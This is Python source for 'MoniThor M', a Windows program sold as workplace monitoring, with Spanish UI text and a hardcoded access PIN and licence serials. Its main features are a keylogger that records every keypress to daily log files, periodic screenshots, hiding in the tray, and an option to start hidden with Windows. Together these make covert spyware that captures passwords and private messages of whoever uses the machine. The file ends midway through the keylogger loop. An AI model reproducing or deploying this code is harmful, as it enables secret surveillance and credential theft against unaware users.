import os
import time
import threading
from datetime import datetime, date
import customtkinter as ctk
from tkinter import filedialog, messagebox
import pyautogui
import keyboard
import sys
import winreg as reg
import cv2
import numpy as np
from PIL import Image, ImageDraw, ImageFont
import ctypes
import pystray

# --- FIX DPI SCALING BUG ---
ctypes.windll.shcore.SetProcessDpiAwareness(0)

# --- CONFIGURACION DE SEGURIDAD ---
CONTRASENA_ACCESO = "7710"
COMBINACION_TECLAS = "ctrl+alt+m"

# --- LISTA DE 50 SERIALES VALIDOS ---
SERIALES_VALIDOS = [
    "7xKqW2", "M9bVf1", "z4RnP8", "tG7mK5", "X2vYh9", "L6wBf3", "p8N1vG", "k4XmW9", "Z3vRj5", "H8fLq2",
    "c1M9xV", "F7nTz4", "r2G6hK", "W9vPj3", "b5XmN1", "Y8kTz4", "v3RfG9", "h6M1xK", "P7vNq2", "z4XmW8",
    "G9fTj1", "c3KbV5", "R8vNq2", "m1XfK7", "V9hTj4", "k2BmN6", "Z8fLq3", "x1M5vG", "H7nTz2", "r4KbV9",
    "W6vPj1", "b3XmN8", "Y9kTz5", "v2RfG4", "h7M1xK", "P8vNq3", "z5XmW9", "G1fTj6", "c4KbV2", "R9vNq5",
    "m2XfK8", "V1hTj7", "k3BmN4", "Z9fLq5", "x2M6vG", "H8nTz5", "r5KbV1", "W7vPj3", "771077", "Y1kTz6"
]

CARPETA_DEFAULT = os.path.join(os.path.expanduser("~"), "Desktop", "Capturas")
REG_RUTA_BASE = r"Software\MoniThorM"
REG_KEY_ACTIVADO = "Activado"
REG_KEY_CARPETA = "CarpetaDestino"
REG_KEY_INTERVALO = "IntervaloSegundos"
REG_KEY_INICIO_AUTO = "InicioAutomatico"
MUTEX_NAME = "Global\MoniThorM_SingleInstance"


class MonitorApp:
    def __init__(self):
        # ========== MUTEX GLOBAL (ANTI-DUPLICADO) ==========
        self.mutex = None
        if not self._crear_mutex_global():
            messagebox.showerror(
                "MoniThor M ya esta en ejecucion",
                "El programa ya se encuentra corriendo.\n\n"
                "Usa Ctrl+Alt+M o doble clic en el icono de la bandeja para mostrar la ventana.\n\n"
                "Si crees que es un error, cierra el proceso desde el Administrador de Tareas."
            )
            sys.exit(0)

        # ========== DEBOUNCE ==========
        self.ultima_apertura_login = 0
        self.DEBOUNCE_SEGUNDOS = 1.5

        # ========== VARIABLES ==========
        self.monitoreando = False
        self.intervalo_segundos = 10
        self.hilo_captura = None
        self.ventana_login = None
        self.keylogger_activo = False
        self.buffer_teclas = []
        self.hilo_keylogger = None
        self.teclas_presionadas = 0
        self.reporte_actual = None
        self.generando_video = False
        self.icono_tray = None

        self.tiempos_map = {
            "3 segundos": 3, "5 segundos": 5, "10 segundos": 10, "15 segundos": 15,
            "30 segundos": 30, "60 segundos": 60, "1.5 minutos": 90, "3 minutos": 180,
            "5 minutos": 300, "10 minutos": 600, "15 minutos": 900, "30 minutos": 1800,
            "60 minutos": 3600, "120 minutos": 7200
        }

        self.cargar_configuracion()

        # ========== CREAR VENTANA PRINCIPAL PRIMERO ==========
        ctk.set_appearance_mode("dark")
        self.root = ctk.CTk()
        self.root.title("MoniThor M - Panel de Control")
        self.root.geometry("540x620")
        self.root.resizable(False, False)

        self.crear_interfaz_pestanas()
        self.root.withdraw()

        # ========== CREAR ICONO DE BANDEJA DESPUES DE self.root ==========
        self.crear_icono_bandeja()

        if not self.verificar_activacion_local():
            self.pedir_serial_activacion()
        else:
            keyboard.add_hotkey(COMBINACION_TECLAS, self._hotkey_callback)
            # Iniciar icono con run_detached
            if self.icono_tray:
                self.icono_tray.run_detached()
            self.root.mainloop()

    # ==================== ICONO EN BANDEJA DEL SISTEMA ====================

    def _crear_imagen_icono(self):
        """Crea una imagen para el icono de la bandeja"""
        try:
            width = 64
            height = 64
            color_fondo = (30, 144, 255)
            color_texto = (255, 255, 255)
            color_borde = (20, 100, 200)

            image = Image.new('RGBA', (width, height), (0, 0, 0, 0))
            dc = ImageDraw.Draw(image)

            # Dibujar circulo de fondo
            dc.ellipse([0, 0, width-1, height-1], fill=color_fondo, outline=color_borde, width=2)

            # Dibujar letra M
            try:
                font = ImageFont.truetype("arial.ttf", 32)
            except:
                try:
                    font = ImageFont.truetype("segoeui.ttf", 32)
                except:
                    font = ImageFont.load_default()

            bbox = dc.textbbox((0, 0), "M", font=font)
            text_width = bbox[2] - bbox[0]
            text_height = bbox[3] - bbox[1]
            x = (width - text_width) / 2
            y = (height - text_height) / 2 - 2
            dc.text((x, y), "M", font=font, fill=color_texto)

            return image
        except Exception as e:
            print(f"Error creando icono: {e}")
            # Fallback: imagen simple roja
            img = Image.new('RGBA', (64, 64), (255, 0, 0, 255))
            return img

    def crear_icono_bandeja(self):
        """Configura el icono de la bandeja del sistema"""
        try:
            imagen = self._crear_imagen_icono()

            # Menu SIN emojis - solo texto plano
            menu = pystray.Menu(
                pystray.MenuItem("📁 Mostrar MoniThor M", self._menu_mostrar),
                #pystray.MenuItem("▶ Pausar / Continuar", self._menu_pausar),
                #pystray.MenuItem("Abrir carpeta de capturas", self._menu_abrir_carpeta),
                #pystray.MenuItem("Salir", self._menu_salir)
            )

            self.icono_tray = pystray.Icon(
                "MoniThorM",
                imagen,
                "MoniThor M",
                menu
            )
            self.icono_tray.on_double_click = self._on_doble_click_tray
            print("[OK] Icono de bandeja creado correctamente")
        except Exception as e:
            print(f"[ERROR] No se pudo crear icono de bandeja: {e}")
            self.icono_tray = None

    # ========== CALLBACKS DE BANDEJA ==========

    def _on_doble_click_tray(self, icono):
        """Doble clic en icono de bandeja"""
        if hasattr(self, 'root') and self.root:
            try:
                self.root.after(0, self.mostrar_ventana_autenticacion)
            except Exception as e:
                print(f"Error en doble clic: {e}")

    def _menu_mostrar(self):
        if hasattr(self, 'root') and self.root:
            try:
                self.root.after(0, self.mostrar_ventana_autenticacion)
            except Exception as e:
                print(f"Error en menu mostrar: {e}")

    def _menu_pausar(self):
        if hasattr(self, 'root') and self.root:
            try:
                self.root.after(0, self.alternar_monitoreo)
            except Exception as e:
                print(f"Error en menu pausar: {e}")

    def _menu_abrir_carpeta(self):
        if hasattr(self, 'root') and self.root:
            try:
                self.root.after(0, self._abrir_carpeta_tray)
            except Exception as e:
                print(f"Error en menu abrir: {e}")

    def _abrir_carpeta_tray(self):
        carpeta = self.entry_carpeta.get() if hasattr(self, 'entry_carpeta') else self.carpeta_destino
        if os.path.exists(carpeta):
            os.startfile(carpeta)

    def _menu_salir(self):
        if hasattr(self, 'root') and self.root:
            try:
                self.root.after(0, self._salir_completo)
            except Exception:
                os._exit(0)

    def _salir_completo(self):
        """Cierra todo limpiamente"""
        if self.monitoreando:
            self.alternar_monitoreo()
        if self.keylogger_activo:
            self.alternar_keylogger()
        if self.icono_tray:
            try:
                self.icono_tray.stop()
            except:
                pass
        self._liberar_mutex()
        self.root.destroy()
        sys.exit(0)

    # ==================== MUTEX GLOBAL ====================

    def _crear_mutex_global(self):
        try:
            self.mutex = ctypes.windll.kernel32.CreateMutexW(None, False, MUTEX_NAME)
            error = ctypes.windll.kernel32.GetLastError()
            if error == 183:
                ctypes.windll.kernel32.CloseHandle(self.mutex)
                self.mutex = None
                return False
            return True
        except Exception as e:
            print(f"Error creando mutex: {e}")
            return True

    def _liberar_mutex(self):
        if self.mutex:
            ctypes.windll.kernel32.ReleaseMutex(self.mutex)
            ctypes.windll.kernel32.CloseHandle(self.mutex)
            self.mutex = None

    # ==================== HOTKEY CALLBACK ====================

    def _hotkey_callback(self):
        try:
            self.root.after(0, self.mostrar_ventana_autenticacion)
        except Exception:
            pass

    # ==================== PERSISTENCIA ====================

    def cargar_configuracion(self):
        try:
            clave = reg.OpenKey(reg.HKEY_CURRENT_USER, REG_RUTA_BASE, 0, reg.KEY_READ)
            try:
                carpeta, _ = reg.QueryValueEx(clave, REG_KEY_CARPETA)
                self.carpeta_destino = carpeta
            except FileNotFoundError:
                self.carpeta_destino = CARPETA_DEFAULT
            try:
                intervalo, _ = reg.QueryValueEx(clave, REG_KEY_INTERVALO)
                self.intervalo_segundos = int(intervalo)
            except FileNotFoundError:
                self.intervalo_segundos = 10
            try:
                inicio_auto, _ = reg.QueryValueEx(clave, REG_KEY_INICIO_AUTO)
                self.inicio_automatico_guardado = (inicio_auto == "True")
            except FileNotFoundError:
                self.inicio_automatico_guardado = False
            reg.CloseKey(clave)
        except FileNotFoundError:
            self.carpeta_destino = CARPETA_DEFAULT
            self.intervalo_segundos = 10
            self.inicio_automatico_guardado = False

    def guardar_configuracion(self):
        try:
            clave = reg.CreateKey(reg.HKEY_CURRENT_USER, REG_RUTA_BASE)
            reg.SetValueEx(clave, REG_KEY_CARPETA, 0, reg.REG_SZ, self.carpeta_destino)
            reg.SetValueEx(clave, REG_KEY_INTERVALO, 0, reg.REG_SZ, str(self.intervalo_segundos))
            reg.SetValueEx(clave, REG_KEY_INICIO_AUTO, 0, reg.REG_SZ, "True" if self.inicio_automatico_guardado else "False")
            reg.CloseKey(clave)
            return True
        except Exception as e:
            print(f"Error guardando configuracion: {e}")
            return False

    def verificar_activacion_local(self):
        try:
            clave = reg.OpenKey(reg.HKEY_CURRENT_USER, REG_RUTA_BASE, 0, reg.KEY_READ)
            valor, _ = reg.QueryValueEx(clave, REG_KEY_ACTIVADO)
            reg.CloseKey(clave)
            return valor == "True"
        except FileNotFoundError:
            return False

    def guardar_activacion_local(self):
        try:
            clave = reg.CreateKey(reg.HKEY_CURRENT_USER, REG_RUTA_BASE)
            reg.SetValueEx(clave, REG_KEY_ACTIVADO, 0, reg.REG_SZ, "True")
            reg.CloseKey(clave)
            return True
        except Exception as e:
            messagebox.showerror("Error", f"No se pudo guardar la activacion: {e}")
            return False

    def pedir_serial_activacion(self):
        self.ventana_serial = ctk.CTkToplevel(self.root)
        self.ventana_serial.title("Activacion de Licencia")
        self.ventana_serial.geometry("400x220")
        self.ventana_serial.resizable(False, False)
        self.ventana_serial.attributes("-topmost", True)
        self.ventana_serial.protocol("WM_DELETE_WINDOW", lambda: self._salir_completo())

        lbl_info = ctk.CTkLabel(self.ventana_serial, text="MoniThor M - Licencia Requerida", font=("Arial", 16, "bold"))
        lbl_info.pack(pady=15)
        lbl_instruccion = ctk.CTkLabel(self.ventana_serial, text="Introduce tu numero de serie:", font=("Arial", 12))
        lbl_instruccion.pack(pady=5)
        self.txt_serial = ctk.CTkEntry(self.ventana_serial, width=280, justify="center", font=("Arial", 14))
        self.txt_serial.pack(pady=10)
        self.txt_serial.focus()
        btn_activar = ctk.CTkButton(self.ventana_serial, text="Activar", fg_color="green", hover_color="darkgreen", command=self.validar_serial)
        btn_activar.pack(pady=10)
        self.root.mainloop()

    def validar_serial(self):
        serial_ingresado = self.txt_serial.get().strip()
        if serial_ingresado in SERIALES_VALIDOS:
            if self.guardar_activacion_local():
                messagebox.showinfo("Exito", "Software activado correctamente.")
                self.ventana_serial.destroy()
                keyboard.add_hotkey(COMBINACION_TECLAS, self._hotkey_callback)
                if self.icono_tray:
                    self.icono_tray.run_detached()
            else:
                self._salir_completo()
        else:
            messagebox.showerror("Error", "Numero de serie invalido.")
            self.ventana_serial.attributes("-topmost", True)

    # ==================== INTERFAZ ====================

    def crear_interfaz_pestanas(self):
        self.tabview = ctk.CTkTabview(self.root, width=500, height=540)
        self.tabview.pack(pady=10, padx=10)

        self.tabview.add("Monitoreo")
        self.tabview.add("Keylogger")
        self.tabview.add("Generar Video")
        self.tabview.add("Configuracion")
        self.tabview.add("Acerca de...")

        # --- PESTANA 1: MONITOREO ---
        lbl_titulo = ctk.CTkLabel(self.tabview.tab("Monitoreo"), text="Control de Actividad Laboral", font=("Arial", 18, "bold"))
        lbl_titulo.pack(pady=15)
        self.lbl_estado = ctk.CTkLabel(self.tabview.tab("Monitoreo"), text="ESTADO: APAGADO", text_color="red", font=("Arial", 16, "bold"))
        self.lbl_estado.pack(pady=10)
        self.btn_inicio = ctk.CTkButton(self.tabview.tab("Monitoreo"), text="Iniciar Monitoreo", fg_color="green", hover_color="darkgreen", height=40, font=("Arial", 14, "bold"), command=self.alternar_monitoreo)
        self.btn_inicio.pack(pady=20, fill="x", padx=40)
        btn_ocultar = ctk.CTkButton(self.tabview.tab("Monitoreo"), text="Ocultar a Bandeja", fg_color="gray", command=self.ocultar_ventana)
        btn_ocultar.pack(pady=10)

        # --- PESTANA 2: KEYLOGGER ---
        lbl_titulo_key = ctk.CTkLabel(self.tabview.tab("Keylogger"), text="Registro de Actividad de Teclado", font=("Arial", 18, "bold"))
        lbl_titulo_key.pack(pady=15)
        self.lbl_estado_key = ctk.CTkLabel(self.tabview.tab("Keylogger"), text="KEYLOGGER: APAGADO", text_color="red", font=("Arial", 16, "bold"))
        self.lbl_estado_key.pack(pady=10)
        self.lbl_contador = ctk.CTkLabel(self.tabview.tab("Keylogger"), text="Teclas registradas hoy: 0", font=("Arial", 12))
        self.lbl_contador.pack(pady=5)
        self.btn_keylogger = ctk.CTkButton(self.tabview.tab("Keylogger"), text="Iniciar Keylogger", fg_color="blue", hover_color="darkblue", height=40, font=("Arial", 14, "bold"), command=self.alternar_keylogger)
        self.btn_keylogger.pack(pady=15, fill="x", padx=40)
        btn_reporte = ctk.CTkButton(self.tabview.tab("Keylogger"), text="Ver Reporte de Hoy", fg_color="purple", hover_color="darkmagenta", height=35, font=("Arial", 12), command=self.ver_reporte_hoy)
        btn_reporte.pack(pady=10)
        btn_abrir_logs = ctk.CTkButton(self.tabview.tab("Keylogger"), text="Abrir Carpeta de Logs", fg_color="gray", command=self.abrir_carpeta_logs)
        btn_abrir_logs.pack(pady=10)

        # --- PESTANA 3: GENERAR VIDEO ---
        self.crear_pestana_video()

        # --- PESTANA 4: CONFIGURACION ---
        lbl_tiempo = ctk.CTkLabel(self.tabview.tab("Configuracion"), text="Intervalo de capturas:", font=("Arial", 13, "bold"))
        lbl_tiempo.pack(anchor="w", padx=20, pady=(10, 2))
        self.combo_tiempo = ctk.CTkOptionMenu(self.tabview.tab("Configuracion"), values=list(self.tiempos_map.keys()), command=self.cambiar_tiempo)
        self.combo_tiempo.set(self._obtener_nombre_intervalo(self.intervalo_segundos))
        self.combo_tiempo.pack(fill="x", padx=20, pady=5)
        lbl_ruta = ctk.CTkLabel(self.tabview.tab("Configuracion"), text="Carpeta de destino:", font=("Arial", 13, "bold"))
        lbl_ruta.pack(anchor="w", padx=20, pady=(15, 2))
        frame_carpeta = ctk.CTkFrame(self.tabview.tab("Configuracion"), fg_color="transparent")
        frame_carpeta.pack(fill="x", padx=10, pady=5)
        self.entry_carpeta = ctk.CTkEntry(frame_carpeta, width=330)
        self.entry_carpeta.insert(0, self.carpeta_destino)
        self.entry_carpeta.pack(side="left", padx=5)
        btn_buscar = ctk.CTkButton(frame_carpeta, text="Examinar...", width=100, command=self.seleccionar_carpeta)
        btn_buscar.pack(side="right", padx=5)
        lbl_info_logs = ctk.CTkLabel(self.tabview.tab("Configuracion"), text="Los logs se guardaran en: [Carpeta]/Logs_Teclado/", font=("Arial", 11), text_color="gray")
        lbl_info_logs.pack(pady=(5, 0))
        self.check_inicio = ctk.CTkCheckBox(self.tabview.tab("Configuracion"), text="Iniciar oculto con Windows")
        if self.inicio_automatico_guardado:
            self.check_inicio.select()
        self.check_inicio.pack(pady=15)
        self.check_inicio.configure(command=self.configurar_inicio_automatico)

        # --- PESTANA 5: ACERCA DE ---
        frame_creditos = ctk.CTkFrame(self.tabview.tab("Acerca de..."))
        frame_creditos.pack(fill="both", expand=True, padx=15, pady=15)
        fecha_hoy = datetime.now().strftime("%d/%m/%Y")
        info_texto = (
            f"Programa: MoniThor M\n"
            f"Descripcion: Software de monitoreo laboral - Este software se proporciona tal cual, sin garantía de ningún tipo, expresa o implícita. El uso del programa es bajo su propio riesgo; el autor no asume responsabilidad por pérdida de datos, daños o fallas derivadas de su uso.\n"
            f"Creador: Attack7710\n"
            f"Version: V2.1\n"
            f"Ubicacion: Bolivia\n"
            f"Contacto: +591 69856525\n"
            f"Fecha: {fecha_hoy}"
        )
        lbl_info = ctk.CTkLabel(frame_creditos, text=info_texto, font=("Arial", 13), justify="left", wraplength=420)
        lbl_info.pack(pady=15, padx=15, anchor="w")

        self.root.protocol("WM_DELETE_WINDOW", self.ocultar_ventana)

    # ==================== PESTANA GENERAR VIDEO ====================

    def crear_pestana_video(self):
        tab = self.tabview.tab("Generar Video")

        frame_superior = ctk.CTkFrame(tab, fg_color="transparent")
        frame_superior.pack(fill="x", padx=15, pady=(10, 5))
        lbl_titulo = ctk.CTkLabel(frame_superior, text="Generar Video desde Capturas", font=("Arial", 18, "bold"))
        lbl_titulo.pack(anchor="w")

        frame_carpeta = ctk.CTkFrame(tab, fg_color="transparent")
        frame_carpeta.pack(fill="x", padx=15, pady=5)
        lbl_carpeta = ctk.CTkLabel(frame_carpeta, text="Carpeta de imagenes:", font=("Arial", 12, "bold"))
        lbl_carpeta.pack(anchor="w")
        self.entry_carpeta_video = ctk.CTkEntry(frame_carpeta, width=300, font=("Arial", 11))
        self.entry_carpeta_video.insert(0, self.carpeta_destino)
        self.entry_carpeta_video.pack(side="left", padx=(0, 5), pady=2)
        btn_examinar_video = ctk.CTkButton(frame_carpeta, text="Examinar...", width=90, command=self.seleccionar_carpeta_video)
        btn_examinar_video.pack(side="left", padx=2)
        btn_cargar = ctk.CTkButton(frame_carpeta, text="Cargar", width=70, fg_color="teal", hover_color="darkcyan", command=self.cargar_imagenes_carpeta)
        btn_cargar.pack(side="left", padx=2)

        frame_controles = ctk.CTkFrame(tab, fg_color="transparent")
        frame_controles.pack(fill="x", padx=15, pady=5)
        self.lbl_total_imagenes = ctk.CTkLabel(frame_controles, text="0 imagenes encontradas", font=("Arial", 11))
        self.lbl_total_imagenes.pack(side="left", padx=(0, 10))
        btn_sel_todas = ctk.CTkButton(frame_controles, text="Sel. todas", width=100, height=26, font=("Arial", 10), command=self.seleccionar_todas)
        btn_sel_todas.pack(side="left", padx=2)
        btn_desel_todas = ctk.CTkButton(frame_controles, text="Deselec.", width=100, height=26, font=("Arial", 10), fg_color="gray", hover_color="dimgray", command=self.deseleccionar_todas)
        btn_desel_todas.pack(side="left", padx=2)

        self.frame_lista = ctk.CTkScrollableFrame(tab, width=460, height=200)
        self.frame_lista.pack(padx=15, pady=5, fill="both", expand=True)
        self.lbl_sin_imagenes = ctk.CTkLabel(self.frame_lista, text="Selecciona una carpeta y presiona 'Cargar'\npara ver las imagenes disponibles", font=("Arial", 12), text_color="gray")
        self.lbl_sin_imagenes.pack(pady=50)

        self.imagenes_disponibles = []
        self.checkboxes_vars = []
        self.checkboxes_widgets = []

        frame_config = ctk.CTkFrame(tab, fg_color="transparent")
        frame_config.pack(fill="x", padx=15, pady=5)
        lbl_fps = ctk.CTkLabel(frame_config, text="FPS:", font=("Arial", 11, "bold"))
        lbl_fps.pack(side="left", padx=(0, 3))
        self.combo_fps = ctk.CTkOptionMenu(frame_config, values=["1", "2", "5", "10", "15", "24", "30"], width=60)
        self.combo_fps.set("5")
        self.combo_fps.pack(side="left", padx=2)
        lbl_calidad = ctk.CTkLabel(frame_config, text="Calidad:", font=("Arial", 11, "bold"))
        lbl_calidad.pack(side="left", padx=(10, 3))
        self.combo_calidad = ctk.CTkOptionMenu(frame_config, values=["Baja", "Media", "Alta"], width=90)
        self.combo_calidad.set("Media")
        self.combo_calidad.pack(side="left", padx=2)
        lbl_res = ctk.CTkLabel(frame_config, text="Resolucion:", font=("Arial", 11, "bold"))
        lbl_res.pack(side="left", padx=(10, 3))
        self.combo_resolucion = ctk.CTkOptionMenu(frame_config, values=["Original", "HD", "480p", "360p"], width=100)
        self.combo_resolucion.set("Original")
        self.combo_resolucion.pack(side="left", padx=2)

        self.lbl_progreso_video = ctk.CTkLabel(tab, text="Listo", font=("Arial", 11), text_color="gray")
        self.lbl_progreso_video.pack(pady=(8, 2))
        self.barra_progreso_video = ctk.CTkProgressBar(tab, width=460)
        self.barra_progreso_video.set(0)
        self.barra_progreso_video.pack(pady=2)

        self.btn_generar_video = ctk.CTkButton(tab, text="GENERAR VIDEO WEBM", fg_color="orange", hover_color="darkorange", height=42, font=("Arial", 14, "bold"), command=self.iniciar_generacion_video)
        self.btn_generar_video.pack(pady=8, fill="x", padx=40)
        lbl_info = ctk.CTkLabel(tab, text="Formato: WebM (VP9) - Sin audio - Compatible con navegadores", font=("Arial", 10), text_color="gray")
        lbl_info.pack()

    def seleccionar_carpeta_video(self):
        carpeta = filedialog.askdirectory()
        if carpeta:
            self.entry_carpeta_video.delete(0, "end")
            self.entry_carpeta_video.insert(0, carpeta)
            self.cargar_imagenes_carpeta()

    def cargar_imagenes_carpeta(self):
        carpeta = self.entry_carpeta_video.get().strip()
        if not carpeta or not os.path.exists(carpeta):
            messagebox.showerror("Error", "La carpeta seleccionada no existe.")
            return

        for widget in self.frame_lista.winfo_children():
            widget.destroy()

        self.imagenes_disponibles = []
        self.checkboxes_vars = []
        self.checkboxes_widgets = []

        extensiones = ('.png', '.jpg', '.jpeg', '.bmp', '.gif', '.tiff', '.webp')
        try:
            archivos = [f for f in os.listdir(carpeta) if f.lower().endswith(extensiones)]
            archivos.sort()
        except Exception as e:
            messagebox.showerror("Error", f"No se pudo leer la carpeta:\n{e}")
            return

        if not archivos:
            self.lbl_sin_imagenes = ctk.CTkLabel(self.frame_lista, text="No se encontraron imagenes en esta carpeta", font=("Arial", 12), text_color="gray")
            self.lbl_sin_imagenes.pack(pady=50)
            self.lbl_total_imagenes.configure(text="0 imagenes encontradas")
            return

        self.lbl_total_imagenes.configure(text=f"{len(archivos)} imagenes encontradas")

        for i, nombre_archivo in enumerate(archivos):
            ruta_completa = os.path.join(carpeta, nombre_archivo)
            self.imagenes_disponibles.append(ruta_completa)
            var = ctk.IntVar(value=1)
            self.checkboxes_vars.append(var)

            tamano_kb = os.path.getsize(ruta_completa) / 1024
            if tamano_kb > 1024:
                tamano_str = f"{tamano_kb/1024:.1f} MB"
            else:
                tamano_str = f"{tamano_kb:.0f} KB"

            fila = ctk.CTkFrame(self.frame_lista, fg_color="transparent")
            fila.pack(fill="x", pady=1)

            nombre_corto = nombre_archivo[:32] + "..." if len(nombre_archivo) > 32 else nombre_archivo
            chk = ctk.CTkCheckBox(fila, text=f"{nombre_corto}  ({tamano_str})", variable=var, font=("Consolas", 10), checkbox_width=16, checkbox_height=16)
            chk.pack(side="left", padx=5, pady=1)
            self.checkboxes_widgets.append(chk)

    def seleccionar_todas(self):
        for var in self.checkboxes_vars:
            var.set(1)

    def deseleccionar_todas(self):
        for var in self.checkboxes_vars:
            var.set(0)

    def iniciar_generacion_video(self):
        if self.generando_video:
            messagebox.showwarning("En progreso", "Ya se esta generando un video.")
            return

        imagenes_seleccionadas = []
        for i, var in enumerate(self.checkboxes_vars):
            if var.get() == 1:
                imagenes_seleccionadas.append(self.imagenes_disponibles[i])

        if not imagenes_seleccionadas:
            messagebox.showwarning("Sin seleccion", "No has seleccionado ninguna imagen.")
            return

        hilo = threading.Thread(target=self.generar_video_webm, args=(imagenes_seleccionadas,), daemon=True)
        hilo.start()

    def generar_video_webm(self, imagenes_seleccionadas):
        self.generando_video = True
        self.btn_generar_video.configure(state="disabled", text="Generando...")

        try:
            total = len(imagenes_seleccionadas)
            self.lbl_progreso_video.configure(text=f"Preparando {total} imagenes...")
            self.barra_progreso_video.set(0)
            self.root.update_idletasks()

            fps = int(self.combo_fps.get())
            calidad_map = {"Baja": 800000, "Media": 2000000, "Alta": 5000000}
            bitrate = calidad_map.get(self.combo_calidad.get(), 2000000)

            primera_ruta = imagenes_seleccionadas[0]
            img_pil = Image.open(primera_ruta)
            ancho_orig, alto_orig = img_pil.size

            res_texto = self.combo_resolucion.get()
            if res_texto == "HD":
                ancho, alto = 1280, 720
            elif res_texto == "480p":
                ancho, alto = 854, 480
            elif res_texto == "360p":
                ancho, alto = 640, 360
            else:
                ancho, alto = ancho_orig, alto_orig

            ancho = ancho if ancho % 2 == 0 else ancho + 1
            alto = alto if alto % 2 == 0 else alto + 1

            carpeta_base = self.entry_carpeta_video.get().strip()
            carpeta_videos = os.path.join(carpeta_base, "Videos_Generados")
            os.makedirs(carpeta_videos, exist_ok=True)

            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            nombre_salida = os.path.join(carpeta_videos, f"MoniThor_Video_{timestamp}.webm")

            fourcc = cv2.VideoWriter_fourcc(*'VP90')
            out = cv2.VideoWriter(nombre_salida, fourcc, fps, (ancho, alto))

            if not out.isOpened():
                fourcc = cv2.VideoWriter_fourcc(*'VP80')
                out = cv2.VideoWriter(nombre_salida, fourcc, fps, (ancho, alto))

            if not out.isOpened():
                nombre_salida = nombre_salida.replace(".webm", ".mp4")
                fourcc = cv2.VideoWriter_fourcc(*'mp4v')
                out = cv2.VideoWriter(nombre_salida, fourcc, fps, (ancho, alto))
                if not out.isOpened():
                    raise Exception("No se pudo inicializar ningun codificador de video.")

            for i, ruta_img in enumerate(imagenes_seleccionadas):
                img = Image.open(ruta_img)
                if img.mode != 'RGB':
                    img = img.convert('RGB')

                if (ancho, alto) != (ancho_orig, alto_orig):
                    img = img.resize((ancho, alto), Image.LANCZOS)
                else:
                    img = img.resize((ancho, alto))

                frame = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
                out.write(frame)

                progreso = (i + 1) / total
                self.barra_progreso_video.set(progreso)
                self.lbl_progreso_video.configure(text=f"Procesando {i+1}/{total} ({int(progreso*100)}%)")
                self.root.update_idletasks()

            out.release()

            tamano_mb = os.path.getsize(nombre_salida) / (1024 * 1024)
            self.lbl_progreso_video.configure(text=f"Video generado: {tamano_mb:.1f} MB")
            self.barra_progreso_video.set(1.0)

            respuesta = messagebox.askyesno(
                "Video generado!",
                f"Video creado exitosamente:\n\n"
                f"Archivo: {os.path.basename(nombre_salida)}\n"
                f"Imagenes: {total}\n"
                f"FPS: {fps}\n"
                f"Resolucion: {ancho}x{alto}\n"
                f"Tamano: {tamano_mb:.1f} MB\n\n"
                f"Abrir carpeta?"
            )
            if respuesta:
                os.startfile(carpeta_videos)

        except Exception as e:
            messagebox.showerror("Error", f"No se pudo generar el video:\n{str(e)}")
            self.lbl_progreso_video.configure(text=f"Error: {str(e)[:40]}")

        finally:
            self.generando_video = False
            self.btn_generar_video.configure(state="normal", text="GENERAR VIDEO WEBM")

    # ==================== KEYLOGGER ====================

    def _obtener_ruta_logs(self):
        carpeta_base = self.entry_carpeta.get().strip() if hasattr(self, 'entry_carpeta') else self.carpeta_destino
        return os.path.join(carpeta_base, "Logs_Teclado")

    def alternar_keylogger(self):
        if not self.keylogger_activo:
            ruta_logs = self._obtener_ruta_logs()
            if not os.path.exists(ruta_logs):
                try:
                    os.makedirs(ruta_logs)
                except Exception as e:
                    messagebox.showerror("Error", f"No se pudo crear carpeta de logs: {e}")
                    return
            self.keylogger_activo = True
            self.teclas_presionadas = 0
            self.buffer_teclas = []
            self.reporte_actual = self._obtener_ruta_reporte()
            self.lbl_estado_key.configure(text="KEYLOGGER: ACTIVO", text_color="green")
            self.btn_keylogger.configure(text="Detener Keylogger", fg_color="red", hover_color="darkred")
            self.hilo_keylogger = threading.Thread(target=self._bucle_keylogger, daemon=True)
            self.hilo_keylogger.start()
            self._escribir_encabezado_reporte()
        else:
            self.keylogger_activo = False
            self.lbl_estado_key.configure(text="KEYLOGGER: APAGADO", text_color="red")
            self.btn_keylogger.configure(text="Iniciar Keylogger", fg_color="blue", hover_color="darkblue")
            self._guardar_buffer()

    def _obtener_ruta_reporte(self):
        fecha = date.today().strftime("%Y-%m-%d")
        ruta_logs = self._obtener_ruta_logs()
        return os.path.join(ruta_logs, f"Reporte_Teclado_{fecha}.txt")

    def _escribir_encabezado_reporte(self):
        encabezado = (
            f"{'='*60}\n"
            f"  MONITHOR M - REPORTE DIARIO DE ACTIVIDAD DE TECLADO\n"
            f"  Fecha: {date.today().strftime('%d/%m/%Y')}\n"
            f"  Inicio: {datetime.now().strftime('%H:%M:%S')}\n"
            f"  Carpeta: {self.entry_carpeta.get().strip() if hasattr(self, 'entry_carpeta') else self.carpeta_destino}\n"
            f"{'='*60}\n\n"
        )
        with open(self.reporte_actual, 'a', encoding='utf-8') as f:
            f.write(encabezado)

    def _procesar_tecla(self, evento):
        try:
            nombre_tecla = evento.name
            teclas_especiales = {
                'space': ' ', 'enter': '\n[ENTER]\n', 'tab': '\t', 'backspace': '[BORRAR]',
                'delete': '[SUPR]', 'shift': '[SHIFT]', 'ctrl': '[CTRL]', 'alt': '[ALT]',
                'caps lock': '[BLOQ_MAYUS]', 'esc': '[ESC]', 'up': '[↑]', 'down': '[↓]',
                'left': '[←]', 'right': '[→]', 'print screen': '[PANTALLA]',
                'num lock': '[NUM_LOCK]', 'scroll lock': '[SCROLL_LOCK]', 'pause': '[PAUSA]',
                'insert': '[INSERT]', 'home': '[INICIO]', 'end': '[FIN]',
                'page up': '[RE_PAG]', 'page down': '[AV_PAG]',
            }
            tecla_final = teclas_especiales.get(nombre_tecla.lower(), nombre_tecla)
            timestamp = datetime.now().strftime("%H:%M:%S")
            self.buffer_teclas.append(f"[{timestamp}] {tecla_final}")
            self.teclas_presionadas += 1
            self.lbl_contador.configure(text=f"Teclas registradas hoy: {self.teclas_presionadas}")
            if len(self.buffer_teclas) >= 20:
                self._guardar_buffer()
        except Exception:
            pass

    def _guardar_buffer(self):
        if not self.buffer_teclas:
            return
        try:
            with open(self.reporte_actual, 'a', encoding='utf-8') as f:
                for entrada in self.buffer_teclas:
                    f.write(entrada + '\n')
            self.buffer_teclas = []
        except Exception:
            pass

    def _bucle_keylogger(self):
        keyboard.on_press(self._procesar_tecla)
        ultimo_flush = time.time()
        while self.keylogger_activo:
            time.sleep(1)
            if time.time() - ultimo_flush >= 30:
